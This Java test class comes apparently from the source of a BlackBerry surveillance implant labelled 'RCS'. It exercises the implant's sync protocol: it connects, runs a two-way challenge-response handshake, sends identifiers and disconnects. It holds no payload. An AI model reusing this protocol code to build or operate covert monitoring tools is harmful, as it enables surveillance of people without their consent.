//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.accessor
 * File         : TransferAccessor.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.accessor;

import blackberry.action.sync.protocol.ProtocolException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

//#ifdef DEBUG
//#endif
/**
 * The Class TransferAccessor.
 */
public final class TransferAccessor extends TransferSocket {
    protected static Debug debug = new Debug("TransferAccessor",
            DebugLevel.VERBOSE);

    /**
     * Instantiates a new transfer accessor.
     */
    public TransferAccessor() {
        super();
    }

    /**
     * Challenge test.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    public void ChallengeTest() throws ProtocolException {
        final boolean ret = initConnectionUrl();
        if (!ret) {
            debug.error("cannot connect");
        }

        debug.trace("send challange");
        sendChallenge();
        getResponse();

        debug.trace("get challange");
        getChallenge();
        sendResponse();

        debug.trace("both challange OK");
        // identificazione
        sendIds();

        debug.trace("disconnect");
        disconnect(true);
    }
}
